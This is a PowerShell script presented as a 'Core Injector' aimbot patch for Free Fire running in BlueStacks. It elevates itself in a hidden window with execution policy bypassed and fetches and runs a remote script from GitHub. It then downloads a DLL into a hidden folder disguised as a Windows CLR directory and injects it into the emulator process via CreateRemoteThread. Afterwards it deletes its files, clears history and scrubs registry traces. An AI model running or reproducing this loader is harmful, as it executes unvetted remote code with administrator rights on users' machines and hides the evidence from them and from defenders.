# ---------------------------------------------------------
# Core Injector (Stable Patch) - GitHub: getx796-Harem
# ---------------------------------------------------------
$c = @'
$u="https://github.com/getx796-Harem/cmdFreefire/releases/download/v1.0/AimbotFemaleFix.dll";$f="mscories.dll";$d="$env:LOCALAPPDATA\Microsoft\CLR_v4.0";$p=Join-Path $d $f;$t="HD-Player";
if(!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `& {iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)}`" -Verb RunAs;exit}
if(!(Test-Path $d)){mkdir $d -Force|Out-Null};attrib +h +s $d;
$ProgressPreference='SilentlyContinue';iwr -Uri $u -OutFile $p -UseBasicParsing -EA 0;
$s=@"
using System;using System.Runtime.InteropServices;using System.Diagnostics;using System.Text;
public class Injector {[DllImport("kernel32.dll")]public static extern IntPtr OpenProcess(int a,bool b,int c);
[DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string d);
[DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr e,string f);
[DllImport("kernel32.dll")]public static extern IntPtr VirtualAllocEx(IntPtr g,IntPtr h,uint i,uint j,uint k);
[DllImport("kernel32.dll")]public static extern bool WriteProcessMemory(IntPtr l,IntPtr m,byte[] n,uint o,out IntPtr p);
[DllImport("kernel32.dll")]public static extern IntPtr CreateRemoteThread(IntPtr q,IntPtr r,uint s,IntPtr t,IntPtr u,uint v,IntPtr w);
public static void Inject(int pid,string path){IntPtr h=OpenProcess(0x001F0FFF,false,pid);
IntPtr a=VirtualAllocEx(h,IntPtr.Zero,(uint)((path.Length+1)*Marshal.SizeOf(typeof(char))),0x3000,0x40);IntPtr o;
WriteProcessMemory(h,a,Encoding.Default.GetBytes(path),(uint)((path.Length+1)*Marshal.SizeOf(typeof(char))),out o);
IntPtr l=GetProcAddress(GetModuleHandle("kernel32.dll"),"LoadLibraryA");CreateRemoteThread(h,IntPtr.Zero,0,l,a,0,IntPtr.Zero);}}
"@
if(Test-Path $p){$pr=Get-Process -Name $t -EA 0;if(!$pr){Start-Process "C:\Program Files\BlueStacks_nxt\HD-Player.exe";Sleep 6;$pr=Get-Process -Name $t -EA 0}
if($pr){Add-Type -TypeDefinition $s -EA 0;[Injector]::Inject($pr.Id,$p)}}
Sleep 5;rm $d -Recurse -Force -EA 0;Clear-History -EA 0;
$m="HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache";
Get-Item $m -EA 0|%{$_.Property}|?{$_ -like "*$f*"}|%{Remove-ItemProperty $m -Name $_ -Force -EA 0}
'@

# ประมวลผลแบบปลอดภัย
$b = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($c))
iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))
